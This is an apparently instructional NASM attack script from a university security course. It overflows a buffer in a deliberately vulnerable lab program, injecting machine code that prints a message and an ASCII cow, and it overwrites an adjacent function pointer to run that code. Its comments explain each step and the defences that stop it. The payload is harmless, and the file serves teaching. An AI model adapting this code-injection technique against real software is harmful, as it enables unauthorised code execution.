; Sample attack script for NASM
;  By Dr. Tyler Bletsch (Tyler.Bletsch@duke.edu) for Computer and Information Security at Duke
;
; For use with the vuln1.c vulnerable program (or any 64-bit program where a function pointer follows immediately after an exploitable buffer)
;
; This attack buffer will cause the program to exit with status code 5.
; 
; Requires knowledge of where the buffer and function pointer are in memory (see constants below), so ASLR could defeat this attack. However, on Ubuntu 18.04, it appears that ASLR doesn't affect the location of the global data region which vuln1.c uses, so ASLR isn't effective in protecting vuln1.
; Performs machine code injection into the buffer, so W^X (also known as NX support) can defeat this attack.
;

BITS 64 ; We're writing 64-bit x86 code

; Some constants representing where the buffer and the function pointer are in memory -- these can be changed as needed

; if running in gdb
; %define buffer_ptr 0x7fffffffdf30  
; %define func_ptr   0x7fffffffe030 
; %define newline_char 0x555555556077 ; this is from the first line the program prints.

%define buffer_ptr 0x7fffffffdff0  ; this attack will be written to this buffer location
%define func_ptr   0x7fffffffe0f0  ; this is the function pointer located after the normal buffer which we're going to overwrite
%define newline_char 0x555555556077 ; this is from the first line the program prints.

org buffer_ptr ; The org directive sets where the assembler *assumes* this code lives in memory. Normally you don't specify this in a normal assembly program, but here we need to know so that label references can work properly, since our code is loaded via *crime* rather than via the OS program loader.

; == BEGIN BUFFER; MACHINE CODE GOES HERE ==

; order of operands: rax	rdi 	rsi 	rdx 	r10 	r8 	r9 	rax
; mov al,-10
; neg al
; mov [newline], al

; print the message.

; set rax to syscall number 1 for `write`
mov rax,1
; set rdi to first param: fd 1 for stdout
mov rdi,1
; set rsi to second param: location of message?
mov rsi,message
; set rdx to length of message
mov rdx,message1_len
; send it
syscall

;
; ; write the newline
; mov rsi,newline_char
; ; print just the single newline char
; mov rdx,1
; ; send it
; syscall
;
; ; write the second line
; mov rsi,message2
; ; print just the single newline char
; mov rdx,message2_len
; ; send it
; syscall
;

mov rax,1
mov rdi,1
mov rsi,newline_char
mov rdx,1
syscall

mov r12,4
mov rbx,cow1

cow_loop:
    ; make cow
    mov rax,1
    mov rdi,1
    mov rsi,rbx
    mov rdx,cow_len
    syscall
    mov rax,1
    mov rdi,1
    mov rsi,newline_char
    mov rdx,1
    syscall
    add rbx,cow_len

    dec r12
    jnz cow_loop

end_cow:

; Set rax to syscall number 60, exit. Unlike the in-class example, we don't have to worry
; about NULL bytes being in our attack code, as gets *only* stops at a newline.
mov rax,60

; set rdi to the first parameter, the exit code, 5 in this case. 
mov rdi,5

; do the system call
; (see https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux for info on how doing system calls works (note -- that page uses AT&T syntax assembly, whereas this program uses Intel syntax))
; (see https://filippo.io/linux-syscall-table/ for syscall numbers (double-click a table row for parameters)
syscall


; == END OF MACHINE CODE; START OF DATA EMBEDDED IN ATTACK BUFFER ==

; here's how we store a message in the attack buffer and note its length -- this attack doesn't make use of the message though
; note that there is no null terminator automatically included in NASM strings
message db "**_You_got_hax0red!_**"
message1_len equ $-message
; nl1 db 0xE2
; nl2 db 0x80
; nl3 db 0xA8
; message2 db "visit https://r.mtdv.me/videos/TLVPIoFKle for help"
; you can use the macro message_len to get the length of the message in bytes
; message2_len equ $-message2

cow1 db "        (__)"
cow_len equ $-cow1
cow2 db "`\------(oo)"
cow3 db "  ||    (__)"
cow4 db "  ||w--||"

message_len equ $-message

; == END OF DATA EMBEDDED IN ATTACK BUFFER, START OF PADDING TO END OF BUFFER ==

; Pad out until the function pointer:
; this code will output "no-op" (do nothing) instructions to the full length of the buffer we're overflowing
; the "$-$$" part means "the number of bytes emitted in this file so far", so the math is calculating size of the buffer, subtracting the bytes emitted by code above, and writing that many 1-byte nop instructions
times (func_ptr-buffer_ptr)-($-$$) nop

; == END OF BUFFER, START OF OVERFLOW INTO FUNCTION POINTER ==

; Overwrite function pointer
dq buffer_ptr

; == END OF ATTACK CODE ==
